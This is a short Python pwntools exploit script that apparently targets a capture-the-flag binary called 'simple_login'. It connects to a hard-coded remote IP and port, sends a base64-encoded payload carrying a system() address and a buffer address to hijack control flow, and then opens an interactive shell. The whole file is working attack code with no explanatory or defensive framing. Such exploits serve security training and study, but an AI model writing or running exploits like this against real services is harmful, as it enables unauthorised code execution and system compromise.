from pwn import *
import base64
debug = False
if debug:
	p = process("./simple_login")
else:
	p = remote("111.198.29.45",30572)
system_addr = 0x08049284
input_addr = 0x0811EB40
payload = "junk" + p32(system_addr) + p32(input_addr)
p.sendline(base64.b64encode(payload))
p.interactive()
